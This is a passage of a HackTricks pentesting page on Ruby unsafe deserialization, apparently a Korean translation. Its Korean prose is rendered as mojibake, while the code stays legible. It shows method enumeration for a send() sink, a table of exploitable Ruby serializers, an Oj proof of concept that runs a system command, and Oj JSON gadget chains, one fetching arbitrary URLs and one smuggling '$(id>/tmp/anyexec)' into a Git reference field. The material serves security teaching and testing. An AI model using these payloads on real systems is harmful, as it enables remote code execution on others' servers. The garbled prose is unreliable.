ì´ë¥¼ ìœ„í•´, ê°ì²´ì˜ ëª¨ë“  ë©”ì„œë“œë¥¼ ì—´ê±°í•˜ì—¬ **ê·¸ ìš”êµ¬ ì‚¬í•­ì„ ì¶©ì¡±í•˜ëŠ” í¥ë¯¸ë¡œìš´ ë©”ì„œë“œë¥¼ ì°¾ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

### ê¸°íƒ€ ë¼ì´ë¸ŒëŸ¬ë¦¬

ì´ ê¸°ìˆ ì€[ **ì´ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared)ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.

ê°ì²´ë¥¼ ì§ë ¬í™”í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ Ruby ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ìˆìœ¼ë©°, ë”°ë¼ì„œ ë¶ˆì•ˆì „í•œ ì—­ì§ë ¬í™” ì¤‘ì— RCEë¥¼ ì–»ê¸° ìœ„í•´ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ í‘œëŠ” ì´ëŸ¬í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ ì¤‘ ì¼ë¶€ì™€ ì—­ì§ë ¬í™”ë  ë•Œ ë¡œë“œëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ í˜¸ì¶œë˜ëŠ” ë©”ì„œë“œë¥¼ ë³´ì—¬ì¤ë‹ˆë‹¤(ê¸°ë³¸ì ìœ¼ë¡œ RCEë¥¼ ì–»ê¸° ìœ„í•´ ì•…ìš©í•  í•¨ìˆ˜):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>ë¼ì´ë¸ŒëŸ¬ë¦¬</strong></td><td><strong>ì…ë ¥ ë°ì´í„°</strong></td><td><strong>í´ë˜ìŠ¤ ë‚´ì—ì„œ ì‹œì‘í•˜ëŠ” ë©”ì„œë“œ</strong></td></tr><tr><td>Marshal (Ruby)</td><td>ì´ì§„</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (í´ë˜ìŠ¤ëŠ” í•´ì‹œ(ë§µ)ì˜ í‚¤ë¡œ ë„£ì–´ì•¼ í•¨)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (í´ë˜ìŠ¤ëŠ” í•´ì‹œ(ë§µ)ì˜ í‚¤ë¡œ ë„£ì–´ì•¼ í•¨)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (í´ë˜ìŠ¤ëŠ” í•´ì‹œ(ë§µ)ì˜ í‚¤ë¡œ ë„£ì–´ì•¼ í•¨)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([json_createì— ëŒ€í•œ ì£¼ì„ì€ ëì—ì„œ ì°¸ì¡°](#table-vulnerable-sinks))</td></tr></tbody></table>

ê¸°ë³¸ ì˜ˆ:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Ojë¥¼ ì•…ìš©í•˜ë ¤ê³  ì‹œë„í•œ ê²½ìš°, `hash` í•¨ìˆ˜ ë‚´ì—ì„œ `to_s`ë¥¼ í˜¸ì¶œí•˜ëŠ” ê°€ì ¯ í´ë˜ìŠ¤ë¥¼ ì°¾ì„ ìˆ˜ ìˆì—ˆê³ , ì´ëŠ” specì„ í˜¸ì¶œí•˜ê³ , fetch_pathë¥¼ í˜¸ì¶œí•˜ì—¬ ë¬´ì‘ìœ„ URLì„ ê°€ì ¸ì˜¤ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ì´ëŠ” ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ ë¹„ìœ„ìƒì ì¸ ì—­ì§ë ¬í™” ì·¨ì•½ì ì„ íƒì§€í•˜ëŠ” ë° í° ë„ì›€ì´ ë©ë‹ˆë‹¤.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport","path": "/", "user": "anyuser", "password": "anypw"
}
```
ë˜í•œ, ì´ì „ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ë©´ ì‹œìŠ¤í…œì— í´ë”ê°€ ìƒì„±ëœë‹¤ëŠ” ê²ƒì´ ë°œê²¬ë˜ì—ˆìœ¼ë©°, ì´ëŠ” ë‹¤ë¥¸ ê°€ì ¯ì„ ì•…ìš©í•˜ì—¬ ì´ë¥¼ ì™„ì „í•œ RCEë¡œ ë³€í™˜í•˜ê¸° ìœ„í•œ ìš”êµ¬ ì‚¬í•­ì…ë‹ˆë‹¤.
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
ìì„¸í•œ ë‚´ìš©ì€ [**ì›ë³¸ ê²Œì‹œë¬¼**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
